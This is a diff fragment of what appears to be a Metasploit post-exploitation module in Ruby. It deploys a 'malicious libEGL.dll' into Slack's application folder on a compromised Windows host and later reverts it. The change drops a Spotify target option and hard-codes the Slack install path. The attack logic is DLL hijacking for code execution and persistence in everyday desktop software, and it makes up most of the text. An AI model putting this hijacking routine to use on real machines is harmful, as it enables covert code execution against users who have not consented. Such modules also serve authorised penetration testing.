@@ -125,8 +125,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('REVERT_HIJACK', [ false, 'revert lbEGL.dll to default?' , false]),
-                                OptBool.new('SPOTIFY', [ false, 'Deploy malicious dll into spotify service?' , false])
+                                OptBool.new('REVERT_HIJACK', [ false, 'revert lbEGL.dll to default?' , false])
                         ], self.class)
  
         end
@@ -143,8 +142,10 @@ def ls_stage1
 
   r=''
   session = client
-  p_name = "libEGL.dll"              # malicious libEGL.dll
-  u_path = datastore['LOCAL_PATH']   # /root/libEGL.dll
+  s_name = "slack.exe"                        # service executable
+  p_name = "libEGL.dll"                       # malicious libEGL.dll
+  u_path = datastore['LOCAL_PATH']            # /root/libEGL.dll
+  d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'].blank?
@@ -154,15 +155,6 @@ def ls_stage1
   else
     print_status("Deploying malicious dll into target system!")
     sleep(1.5)
-  end
-
-  # chose were to deploy payload (slack OR spotify)...
-  if datastore['SPOTIFY'] == 'true'
-     d_path = "%APPDATA%\\Spotify" # remote path on target system (spotify)
-     s_name = "Spotify.exe" # service executable
-  else
-    d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
-    s_name = "slack.exe" # service executable
   end
 
     # check if original libEGL.dll exist in target
@@ -223,8 +215,10 @@ def ls_stage2
 
   r=''
   session = client
-  p_name = "libEGL.dll" # malicious libEGL.dll
-  b_name = "libEGL.bk" # service executable
+  s_name = "slack.exe"                        # service executable
+  p_name = "libEGL.dll"                       # malicious libEGL.dll
+  b_name = "libEGL.bk"                        # service executable
+  d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['REVERT_HIJACK'].blank?
@@ -234,16 +228,6 @@ def ls_stage2
   else
     print_status("Deleting malicious dll!")
     sleep(1.5)
-  end
-
-
-  # chose were to deploy payload (slack OR spotify)...
-  if datastore['SPOTIFY'] == 'true'
-     d_path = "%APPDATA%\\Spotify" # remote path on target system (spotify)
-     s_name = "Spotify.exe" # service executable
-  else
-    d_path = "%LOCALAPPDATA%\\slack\\app-2.3.2" # remote path on target system (slack software)
-    s_name = "slack.exe" # service executable
   end
 
     # check if backup exist in target
